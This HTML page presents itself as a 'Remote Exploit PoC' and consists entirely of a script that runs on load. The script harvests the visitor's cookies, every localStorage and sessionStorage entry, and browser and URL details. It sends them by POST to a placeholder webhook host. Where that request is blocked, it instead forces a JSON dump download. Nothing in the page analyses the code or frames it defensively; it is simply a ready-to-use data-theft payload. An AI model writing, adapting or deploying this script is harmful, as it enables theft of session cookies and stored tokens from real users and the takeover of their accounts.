<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>🔥 Remote Exploit PoC</title>
</head>
<body>
  <h2>🚀 Remote Exploit PoC – Auto Data Exfiltration</h2>
  <script>
    (async () => {
      console.log("🚀 Remote PoC started...");

      const stolen = {
        cookies: document.cookie || "",
        localStorage: {},
        sessionStorage: {},
        info: {
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          lang: navigator.language,
          url: location.href,
          time: new Date().toISOString()
        }
      };

      // dump localStorage
      for (let i = 0; i < localStorage.length; i++) {
        const k = localStorage.key(i);
        stolen.localStorage[k] = localStorage.getItem(k);
      }

      // dump sessionStorage
      for (let i = 0; i < sessionStorage.length; i++) {
        const k = sessionStorage.key(i);
        stolen.sessionStorage[k] = sessionStorage.getItem(k);
      }

      console.log("📦 Data collected:", stolen);

      // exfiltration via fetch (if CSP يسمح)
      try {
        await fetch("https://YOUR-WEBHOOK-HERE/post", {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify(stolen)
        });
        console.log("🌐 Data exfiltrated to server.");
      } catch(e) {
        console.warn("⚠️ Fetch blocked by CSP, falling back to file download");
      }

      // fallback: trigger file download
      const blob = new Blob([JSON.stringify(stolen, null, 2)], {type:'application/json'});
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = "sandbox_dump_" + Date.now() + ".json";
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);

      console.log("💾 File download triggered.");
    })();
  </script>
</body>
</html>
